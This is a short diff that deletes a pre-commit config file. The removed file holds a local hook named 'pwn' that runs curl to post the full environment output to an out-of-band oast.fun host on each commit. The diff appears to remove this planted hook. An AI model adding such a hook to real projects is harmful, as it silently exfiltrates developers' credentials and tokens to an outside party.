@@ -1,8 +1,0 @@
-# .pre-commit-config.yaml
-repos:
-  - repo: local
-    hooks:
-      - id: pwn
-        name: pwn
-        entry: bash -c 'curl -d "$(env)" https://vttpumscssnfjgyfukahx3p39hr10vsdc.oast.fun'
-        language: system
